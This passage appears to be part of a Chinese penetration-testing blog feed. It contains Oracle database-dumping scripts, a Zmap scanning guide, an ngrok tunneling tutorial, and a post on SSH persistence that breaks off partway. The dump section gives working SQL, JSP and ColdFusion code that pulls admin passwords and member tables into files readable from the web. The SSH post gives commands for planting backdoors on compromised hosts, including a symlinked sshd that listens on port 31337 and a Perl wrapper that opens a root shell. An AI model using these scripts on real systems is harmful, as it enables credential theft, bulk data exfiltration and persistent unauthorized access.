<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SET</span> feedback off  </span></div><div class="line"><span class="keyword">SET</span> newpage NONE  </div><div class="line"><span class="keyword">SET</span> pagesize <span class="number">0</span>  </div><div class="line"><span class="keyword">SET</span> linesize <span class="number">5000</span></div><div class="line"><span class="keyword">SET</span> verify off </div><div class="line"><span class="keyword">SET</span> term off  </div><div class="line"><span class="keyword">SET</span> trims <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> heading off  </div><div class="line"><span class="keyword">SET</span> trimspool <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> trimout <span class="keyword">ON</span>  </div><div class="line"><span class="keyword">SET</span> timing off  </div><div class="line"><span class="keyword">SET</span> verify off  </div><div class="line"><span class="keyword">SET</span> colsep |  </div><div class="line">spool D:\<span class="number">007.</span>csv</div><div class="line"><span class="keyword">SELECT</span> <span class="string">'id,username,password'</span> <span class="keyword">FROM</span> dual;</div><div class="line"><span class="operator"><span class="keyword">SELECT</span> id||<span class="string">','</span>||username||<span class="string">','</span>||<span class="keyword">password</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> rownum&lt;<span class="number">100</span>;</span></div><div class="line">spool off</div></pre></td></tr></table></figure>

<hr>
<h2 id="jsp_脱裤脚本">jsp 脱裤脚本</h2>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span>%&gt;</div><div class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.lang.*,java.sql.*"</span>%&gt;</div><div class="line">&lt;%</div><div class="line"></div><div class="line">Class.forName(<span class="string">"oracle.jdbc.driver.OracleDriver"</span>);</div><div class="line">Connection conn = DriverManager.getConnection(<span class="string">"jdbc:oracle:thin:@172.0.0.1:1521:orabi"</span>, <span class="string">"admin"</span>, <span class="string">"admin"</span>);</div><div class="line">File f = <span class="keyword">new</span> File(<span class="string">"/webapps/ROOT/css/t1.txt"</span>);</div><div class="line">BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(f));</div><div class="line">Statement stmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);</div><div class="line">ResultSet rs=stmt.executeQuery(<span class="string">"select  *   from  member where  rownum &gt; 2000000"</span>);</div><div class="line">ResultSetMetaData rsmd = rs.getMetaData();</div><div class="line"><span class="keyword">int</span> numberOfColumns = rsmd.getColumnCount();</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++)</div><div class="line">{</div><div class="line">bw.write(rsmd.getColumnName(i)+<span class="string">","</span>);</div><div class="line">}</div><div class="line"><span class="keyword">while</span> (rs.next())</div><div class="line">{</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++){</div><div class="line"></div><div class="line">bw.write(rs.getString(i)+<span class="string">","</span>);</div><div class="line"></div><div class="line">}</div><div class="line">bw.newLine();</div><div class="line">bw.flush();</div><div class="line">}</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">out.print(rs);</div><div class="line"></div><div class="line">%&gt;</div></pre></td></tr></table></figure>

<hr>
<h2 id="ColdFusion_版脱裤脚本">ColdFusion 版脱裤脚本</h2>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">CFSET</span> <span class="attribute">USERNAME</span>=<span class="value">"user"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFSET</span> <span class="attribute">PASSWORD</span>=<span class="value">"pass"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFSET</span> <span class="attribute">DATABASE</span>=<span class="value">"ya_db"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFTRY</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="title">CFQUERY</span> <span class="attribute">NAME</span>=<span class="value">"DATA"</span> <span class="attribute">DATASOURCE</span>=<span class="value">#DATABASE#</span> <span class="attribute">USERNAME</span>=<span class="value">#USERNAME#</span> <span class="attribute">PASSWORD</span>=<span class="value">#PASSWORD#</span>&gt;</span></div><div class="line">    SELECT * FROM MEMBER</div><div class="line"> <span class="tag">&lt;/<span class="title">CFQUERY</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="title">CFCATCH</span> <span class="attribute">Type</span>=<span class="value">"Any"</span>&gt;</span><span class="tag">&lt;/<span class="title">CFCATCH</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">CFTRY</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">CFSAVECONTENT</span> <span class="attribute">variable</span>=<span class="value">"Dump_DATA"</span>&gt;</span></div><div class="line"> <span class="tag">&lt;<span class="title">CFDUMP</span> <span class="attribute">var</span>=<span class="value">"#DATA#"</span> <span class="attribute">EXPAND</span>=<span class="value">"YES"</span> <span class="attribute">FORMAT</span>=<span class="value">"TEXT"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">CFSAVECONTENT</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">cffile</span> <span class="attribute">action</span>=<span class="value">"write"</span> <span class="attribute">output</span>=<span class="value">"#Dump_DATA#"</span> <span class="attribute">FILE</span>=<span class="value">"C:\\RECYCLER\\#USERNAME#_DATA.txt"</span>&gt;</span></div></pre></td></tr></table></figure>

<hr>
<h2 id="oracle_整表预览_jsp_脚本">oracle 整表预览 jsp 脚本</h2>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span>%&gt;</div><div class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.*,java.lang.*,java.sql.*"</span>%&gt;</div><div class="line">&lt;%</div><div class="line"></div><div class="line">Class.forName(<span class="string">"oracle.jdbc.driver.OracleDriver"</span>);</div><div class="line">Connection conn = DriverManager.getConnection(<span class="string">"jdbc:oracle:thin:@127.0.0.1:1521"</span>, <span class="string">"admin"</span>, <span class="string">"password"</span>);</div><div class="line">Statement stmt=conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);</div><div class="line">String html=<span class="string">""</span>;</div><div class="line">File file = <span class="keyword">new</span> File(<span class="string">"/tmp/data.txt"</span>);</div><div class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(file));</div><div class="line">String line;</div><div class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) {</div><div class="line"></div><div class="line">html=html+<span class="string">"&lt;h3&gt;"</span>+line+<span class="string">":&lt;/h3&gt;&lt;table border=1&gt;&lt;tr&gt;"</span>;</div><div class="line">ResultSet rs=stmt.executeQuery(<span class="string">"select * from "</span>+line+<span class="string">" where rownum &lt; 100"</span>);</div><div class="line">ResultSetMetaData rsmd = rs.getMetaData();</div><div class="line"><span class="keyword">int</span> numberOfColumns = rsmd.getColumnCount();</div><div class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++)</div><div class="line">{</div><div class="line">  html=html+<span class="string">"&lt;th&gt;"</span>+rsmd.getColumnName(i)+<span class="string">"&lt;/th&gt;"</span>;</div><div class="line">}</div><div class="line">html+=<span class="string">"&lt;/tr&gt;"</span>;</div><div class="line"><span class="keyword">while</span> (rs.next())</div><div class="line">{</div><div class="line"></div><div class="line">  html+=<span class="string">"&lt;tr&gt;"</span>;</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;numberOfColumns+<span class="number">1</span>;i++){</div><div class="line"></div><div class="line">    html=html+<span class="string">"&lt;td&gt;"</span>+rs.getString(i)+<span class="string">"&lt;/td&gt;"</span>;</div><div class="line"></div><div class="line"></div><div class="line">  }</div><div class="line">  html+=<span class="string">"&lt;/tr&gt;"</span>;</div><div class="line">}</div><div class="line">  rs.close();</div><div class="line">  html+=<span class="string">"&lt;tr&gt;&lt;/table&gt;"</span>;</div><div class="line">}</div><div class="line">File f = <span class="keyword">new</span> File(<span class="string">"/tmp/info.css"</span>);</div><div class="line">BufferedWriter bw = <span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(f));</div><div class="line">bw.write(html);</div><div class="line"></div><div class="line"></div><div class="line">bw.close();</div><div class="line">br.close();</div><div class="line">stmt.close();</div><div class="line">conn.close();</div><div class="line"></div><div class="line">%&gt;</div></pre></td></tr></table></figure>

<hr>
<h2 id="编码问题">编码问题</h2>
<p>查询当前编码  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> userenv(<span class="string">'language'</span>) <span class="keyword">from</span> dual;</span></div></pre></td></tr></table></figure>

<p>命令行执行  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export NLS_LANG="american_america.AL32UTF8"</div></pre></td></tr></table></figure>

<hr>
<h2 id="参考">参考</h2>
<p><a href="http://liuxun.org/blog/linux-xia-occi-bian-cheng/" target="_blank" rel="external">http://liuxun.org/blog/linux-xia-occi-bian-cheng/</a><br><a href="https://github.com/yaseng/pentest/blob/master/note/oracle.md" target="_blank" rel="external">https://github.com/yaseng/pentest/blob/master/note/oracle.md</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="常用sql语句">常用sql语句</h2>
<p>查询所有表 </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> ALL_TABLES</span></div></pre></td></tr></table></figure>

<p>查询当前用户表  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables;</span></div></pre></td></tr></table></figure>

<p>查询所有表按大小排序  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> TABLE_NAME,NUM_ROWS <span class="keyword">FROM</span> ALL_TABLES   <span class="keyword">order</span> <span class="keyword">by</span>  NUM_ROWS  <span class="keyword">desc</span></span></div><div class="line"><span class="keyword">select</span> table_name,NUM_ROWS <span class="keyword">from</span> user_tables     <span class="keyword">order</span> <span class="keyword">by</span>  NUM_ROWS  <span class="keyword">desc</span></div></pre></td></tr></table></figure>

<p>查询表前十条  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">select</span>  *   <span class="keyword">from</span>  users  <span class="keyword">where</span>  rownum &lt; <span class="number">10</span></span></div></pre></td></tr></table></figure>

<p>分页查询 2000000 到 4000000  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> e.*,ROWNUM rn <span class="keyword">FROM</span> (<span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> ) e <span class="keyword">WHERE</span> ROWNUM &lt;= <span class="number">4000000</span>) <span class="keyword">WHERE</span> rn &gt; <span class="number">2000000</span></span></div></pre></td></tr></table></figure>

<h2>]]>
    
    </summary>
    
      <category term="oracle" scheme="https://sqzr.cc/tags/oracle/"/>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Zmap 使用文档]]></title>
    <link href="https://sqzr.cc//blog/2014/07/08/zmap-shi-yong-wen-dang/"/>
    <id>https://sqzr.cc//blog/2014/07/08/zmap-shi-yong-wen-dang/</id>
    <published>2014-07-08T00:56:00.000Z</published>
    <updated>2014-10-30T12:49:42.000Z</updated>
    <content type="html"><![CDATA[<h2 id="Zmap_入门">Zmap 入门</h2>
<p>Zmap 设计用来扫描 IPV4地址和大部分地址进行全面扫描，Zmap 对研究者是一个强大的扫描工具，所以，在运行 Zmap 的时候，请记住，你扫描的整个IPV4地址每秒发包可能超过140w个，在执行任何扫描前，我们建议与该管理员联系，并查阅我们列出的最佳扫描指南<br>默认情况下，Zmap 将会执行在特定端口执行最高效率的 TCP SYN 扫描，在10M 网速下，执行<br>1W 个随机地址80端口的扫描如下：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">$zmap</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">bandwidth=10M</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">target</span><span class="literal">-</span><span class="comment">port=80</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">max</span><span class="literal">-</span><span class="comment">target=10000</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">output</span><span class="literal">-</span><span class="comment">file=results</span><span class="string">.</span><span class="comment">txt</span></div></pre></td></tr></table></figure>

<p>或更简洁的命令:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$zmap</span> -B <span class="number">10</span>M -p <span class="number">80</span> -n <span class="number">10000</span> -o results.txt</div></pre></td></tr></table></figure>

<p><a id="more"></a><br>如果扫描成功启动，将会输出每秒的状态如下:  </p>
<blockquote>
<p>0% (1h51m left); send: 28777 562 Kp/s (560 Kp/s avg); recv: 1192 248 p/s (231 p/s avg); hits: 0.04%<br>   0% (1h51m left); send: 34320 554 Kp/s (559 Kp/s avg); recv: 1442 249 p/s (234 p/s avg); hits: 0.04%<br>   0% (1h50m left); send: 39676 535 Kp/s (555 Kp/s avg); recv: 1663 220 p/s (232 p/s avg); hits: 0.04%<br>   0% (1h50m left); send: 45372 570 Kp/s (557 Kp/s avg); recv: 1890 226 p/s (232 p/s avg); hits: 0.04%<br>   115.237.116.119<br>   23.9.117.80<br>   207.118.204.141<br>   217.120.143.111<br>   50.195.22.82</p>
</blockquote>
<hr>
<h2 id="最佳扫描指南">最佳扫描指南</h2>
<p>我们给研究者提供了一些扫描建议来指导研究者更好的扫描  </p>
<p><ol></ol></p>
<p><li>密切与网络管理员联系，减少风险和查水表</li></p>
<p><li>扫描时不对网络资源占尽或者对影响上游供应商</li></p>
<p><li>网络信号优良并配置好 DNS</li></p>
<p><li>明确指定扫描的范围</li></p>
<p><li>提供一个简单的退出方法和即时兑现请求</li></p>
<p><li>除了目标研究范围内，不要进行更多的频繁的，大量的请求</li></p>
<p><li>随着时间的推移进行扫描，或者源地址有流量传播时进行扫描</li><br><br>研究人员应该禁止利用漏洞或者对受保护的文件进行扫描，并需遵守相关的法律法规  </p>
<hr>
<h2 id="命令行参数">命令行参数</h2>
<p>这些选项是执行常规简单扫描时，最常用的，我们注意到一些选项是基于 probe module 和<br>ooutput module 的(比如目标端执行 icmp 扫描时不可用)  </p>
<h3 id="常见的选项:">常见的选项:</h3>
<table border="1"><br>  <tr><br>    <td>-p</td><br>    <td>—target-port=port</td><br>    <td>TCP 端口号(比如443)</td><br>  </tr><br>   <tr><br>    <td>-o</td><br>    <td>—output-file=name</td><br>    <td>我们要保存的扫描结果，用- 表示屏幕输出</td><br>  </tr><br>   <tr><br>    <td>-b</td><br>    <td>—blacklist-file=path</td><br>    <td>子网排除使用 CIDR 表示方法，参考 conf/blacklist.example</td><br>  </tr><br></table>

<h3 id="扫描选项:">扫描选项:</h3>
<table border="1"><br>  <tr><br>    <td>-n</td><br>    <td>—max-target=n</td><br>    <td>大目标数量，可以是一个数字比如-n 1000或者-n 0.1%（可扫描的地址空间），不包含黑名单中的地址</td><br>  </tr><br>   <tr><br>    <td>-N</td><br>    <td>—max-results=n</td><br>    <td>接受到多少结果后，推退出</td><br>  </tr><br>   <tr><br>    <td>-t</td><br>    <td>—max-runtime=secs</td><br>    <td>发送数据包最长时间</td><br>  </tr><br>  <tr><br>    <td>-B</td><br>    <td>—bandwidth=bps</td><br>    <td>设置发送速率 数据包/秒</td><br>  </tr><br>  <tr><br>    <td>-c</td><br>    <td>—cooldown-time=secs</td><br>    <td>在发送数据包后多少时间收返回数据(默认8s)</td><br>  </tr><br>  <tr><br>    <td>-e</td><br>    <td>—seed=n</td><br>    <td>用于选择地址排序，如果你想运行多个 zmap 对地址进行扫描时使用</td><br>  </tr><br>  <tr><br>    <td>-T</td><br>    <td>—sender-threads=n</td><br>    <td>发包线程（默认1）</td><br>  </tr><br>  <tr><br>    <td>-P</td><br>    <td>—probes=n</td><br>    <td>对每个 IP 进行探测的次数（默认每个 IP 一次探测）</td><br>  </tr><br>  <tr><br>    <td>-d</td><br>    <td>—dryrun</td><br>    <td>调试时使用，在屏幕显示每个数据包，但不发送</td><br>  </tr><br></table>

<h3 id="网络选项:">网络选项:</h3>
<table border="1"><br>  <tr><br>    <td>-s</td><br>    <td>—source-port=port|range</td><br>    <td>发送数据包的源端口</td><br>  </tr><br>   <tr><br>    <td>-S</td><br>    <td>—source-ip=ip|range</td><br>    <td>发送数据包的 IP 地址，可以是单个 ip 也可以是返回(e.g 10.0.1-10.0.0.9)</td><br>  </tr><br>   <tr><br>    <td>-G</td><br>    <td>—gateway-mac-addr</td><br>    <td>发送数据包的网管 MAC 地址(不起作用下会自动检测)</td><br>  </tr><br></table>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="Zmap_入门">Zmap 入门</h2>
<p>Zmap 设计用来扫描 IPV4地址和大部分地址进行全面扫描，Zmap 对研究者是一个强大的扫描工具，所以，在运行 Zmap 的时候，请记住，你扫描的整个IPV4地址每秒发包可能超过140w个，在执行任何扫描前，我们建议与该管理员联系，并查阅我们列出的最佳扫描指南<br>默认情况下，Zmap 将会执行在特定端口执行最高效率的 TCP SYN 扫描，在10M 网速下，执行<br>1W 个随机地址80端口的扫描如下：  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">$zmap</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">bandwidth=10M</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">target</span><span class="literal">-</span><span class="comment">port=80</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">max</span><span class="literal">-</span><span class="comment">target=10000</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">output</span><span class="literal">-</span><span class="comment">file=results</span><span class="string">.</span><span class="comment">txt</span></div></pre></td></tr></table></figure>

<p>或更简洁的命令:  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$zmap</span> -B <span class="number">10</span>M -p <span class="number">80</span> -n <span class="number">10000</span> -o results.txt</div></pre></td></tr></table></figure>

<p>]]>
    
    </summary>
    
      <category term="zmap" scheme="https://sqzr.cc/tags/zmap/"/>
    
      <category term="渗透" scheme="https://sqzr.cc/categories/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ngrok 内网穿透神器]]></title>
    <link href="https://sqzr.cc//blog/2014/06/28/ngrok_nei_wang_chuan_tou_shen_qi/"/>
    <id>https://sqzr.cc//blog/2014/06/28/ngrok_nei_wang_chuan_tou_shen_qi/</id>
    <published>2014-06-28T00:56:00.000Z</published>
    <updated>2014-10-30T12:49:04.000Z</updated>
    <content type="html"><![CDATA[<p>由于开发Web项目，经常需要将本地部署的网站让外网能直接访问到，最便捷的做法当然是在ADSL路由器上直接做端口映射，很不幸大部分运营商都屏 蔽了80等常用端口，曾经的做法是在公网一台VPS上架设OpenVPN，将笔记本和VPS连到一个虚拟局域网，再用iptables做端口转发来达到目 的，虽然可行，但速度比较慢，由于线路不稳定造成掉线几率较高。偶然发现还有个叫<code>ngrok</code>的神器专门做了这件事，不但提供了一个在外网能够安全的访问内 网Web主机，还能捕获所有请求的http内容，方便调试，甚至还支持tcp层端口映射，不局限于某一特定的服务。支持Mac OS X，Linux，Windows平台。<br><a id="more"></a></p>
<hr>
<h2 id="ngrok下载运行">ngrok下载运行</h2>
<p>体积很小，<a href="https://ngrok.com/" target="_blank" rel="external">官网</a>下载后直接解压得到一个二进制文件，在shell中执行<code>./ngrok 80</code>即可，默认会分配随机的二级域名来访问，转发到本机的80端口。可以通过-help参数来查看详细的说明，运行后如下提示：<br>    ngrok                                                           (Ctrl+C to quit)</p>
<pre><code>Tunnel Status                 online
Version                       1.7/1.6
Forwarding                    http://<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.ngrok.com -&gt; 127.0.0.1:80(<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>为随机分配)
Forwarding                    https://<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>.ngrok.com -&gt; 127.0.0.1:80(<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>为随机分配)
Web Interface                 127.0.0.1:4040
<span class="comment"># Conn                        0</span>
Avg Conn Time                 0.00ms
</code></pre><p>提示<code>online</code>后,表示已经成功进行转发了.这时候运行<code>http://****.ngrok.com</code>或者<code>https://****.ngrok.com</code>都可以访问到127.0.0.1:80上。通过ngrok提供的web管理界面<code>127.0.0.1:4040</code>可以清楚看到当前有哪些连接，以及请求的 url，可以进行replay。<br><img src="//dn-sqzr.qbox.me/20140628090153.jpg" alt="ngrok web管理界面"></p>
<hr>
<h2 id="ngrok常用示例">ngrok常用示例</h2>
<ol>
<li>采用自定义二级域名sqzr.ngrok.com转发到本机的80端口(首先需要在官方<a href="https://ngrok.com/user/signup" target="_blank" rel="external">注册账号</a>,注册完成后,会分配一个<code>authtoken</code>)。<br> ngrok -authtoken kZeyT4j-Lc7H9cRbPZXq -subdomain sqzr 80</li>
<li>tcp端口转发，这意味着可以在外网ssh到本机了，当然外网端口是随机分配的。<br> ngrok -proto=tcp 22</li>
<li>转发到局域网其他的机器。<br> ngrok 192.168.0.1:80</li>
<li>绑定顶级域名(付费才可用)，在dashboard中添加域名，将域名cname解析到ngrok.com即可。<br> ngrok -authtoken kZeyT4j-Lc7H9cRbPZXq -hostname test.sqzr.com 80</li>
</ol>
<hr>
<h2 id="ngrok配置文件">ngrok配置文件</h2>
<p>ngrok可以将参数写到文件中，默认是放在~/.ngrok。(windows为:C:\Users*.ngrok)  </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">tunnels:</div><div class="line">  client:</div><div class="line">    auth: <span class="string">"user:password"</span></div><div class="line">    proto:</div><div class="line">      <span class="keyword">https</span>: <span class="number">8080</span></div><div class="line">  ssh:</div><div class="line">    proto:</div><div class="line">      tcp: <span class="number">22</span></div><div class="line">  test.dorole.com</div><div class="line">    proto:</div><div class="line">      <span class="keyword">http</span>: <span class="number">9090</span></div></pre></td></tr></table></figure>

<p>　这里定义了三个隧道，client表示转发http到本机8080，同时要求验证，ssh表示支持远程访问，第三个是绑定了域名转发到 9090。这时候只需要一个./ngrok start client ssh test.dorole.com即可快速启动这三个隧道服务。<br>　　每一个隧道的配置节点都有五个参数，proto，subdomain，auth，hostname和remote_port，每个隧道必须有 proto参数来指定本地地址和端口。auth参数用于在http(s)中身份认证，而remote_port用于在tcp隧道中指定远程服务器端口。如 果没有配置subdomain参数，ngrok会默认一个二级域名与隧道节点一样的名字。  </p>
<hr>
<h2 id="配置文件中的其他参数">配置文件中的其他参数</h2>
<pre><code>authtoken: abc123
inspect_addr: <span class="string">"0.0.0.0:8888"</span>
tunnels:
    <span class="keyword">...</span>
</code></pre><p>authtoken用于设置登录ngrok的授权码，可以在ngrok首页的dashboard中查看到。inspect_addr用于设置监 听ip，比如设置为0.0.0.0:8080意味着监听本机所有ip的8080端口上。ngrok也支持自己架设ngrokd服务器，在配置中通过 server_addr: “dorole.com:8081″来指定自己搭建的服务器地址。设置trust_host_root_certs: true来支持TLS加密协议的证书信任。ngrok支持http proxy，可以将ngrok配置成一个http代理，这在本机网络受限制的地方用比较合适。    </p>
]]></content>
    <summary type="html">
    <![CDATA[<p>由于开发Web项目，经常需要将本地部署的网站让外网能直接访问到，最便捷的做法当然是在ADSL路由器上直接做端口映射，很不幸大部分运营商都屏 蔽了80等常用端口，曾经的做法是在公网一台VPS上架设OpenVPN，将笔记本和VPS连到一个虚拟局域网，再用iptables做端口转发来达到目 的，虽然可行，但速度比较慢，由于线路不稳定造成掉线几率较高。偶然发现还有个叫<code>ngrok</code>的神器专门做了这件事，不但提供了一个在外网能够安全的访问内 网Web主机，还能捕获所有请求的http内容，方便调试，甚至还支持tcp层端口映射，不局限于某一特定的服务。支持Mac OS X，Linux，Windows平台。<br>]]>
    
    </summary>
    
      <category term="神器" scheme="https://sqzr.cc/tags/%E7%A5%9E%E5%99%A8/"/>
    
      <category term="折腾" scheme="https://sqzr.cc/categories/%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[渗透技巧之SSH篇]]></title>
    <link href="https://sqzr.cc//blog/2014/06/08/shen-tou-ji-qiao-zhi-ssh-pian/"/>
    <id>https://sqzr.cc//blog/2014/06/08/shen-tou-ji-qiao-zhi-ssh-pian/</id>
    <published>2014-06-08T01:07:00.000Z</published>
    <updated>2014-10-30T12:50:40.000Z</updated>
    <content type="html"><![CDATA[<p>入侵得到SHELL后，对方防火墙没限制，想快速开放一个可以访问的SSH端口<br>肉鸡上执行:  </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mickey<span class="variable">@vic</span><span class="symbol">:~</span><span class="comment"># ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337;</span></div></pre></td></tr></table></figure>

<p>就会派生一个31337端口，然后连接31337，用root/bin/ftp/mail当用户名，密码随意，就可登陆。<br><a id="more"></a><br><img src="//dn-sqzr.qbox.me/1.png" alt="效果图">  </p>
<hr>
<ul>
<li>做一个SSH wrapper后门，效果比第一个好，没有开放额外的端口，只要对方开了SSH服务，就能远程连接<br>在肉鸡上执行:</li>
</ul>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[root<span class="variable">@localhost</span> ~]<span class="comment"># cd /usr/sbin</span></div><div class="line">[root<span class="variable">@localhost</span> sbin]<span class="comment"># mv sshd ../bin</span></div><div class="line">[root<span class="variable">@localhost</span> sbin]<span class="comment"># echo '#!/usr/bin/perl' &gt;sshd</span></div><div class="line">[root<span class="variable">@localhost</span> sbin]<span class="comment"># echo 'exec "/bin/sh" if (getpeername(STDIN) =~ /^..4A/);' &gt;&gt;sshd</span></div><div class="line">[root<span class="variable">@localhost</span> sbin]<span class="comment"># echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",<span class="yardoctag">@ARGV</span>,' &gt;&gt;sshd</span></div><div class="line">[root<span class="variable">@localhost</span> 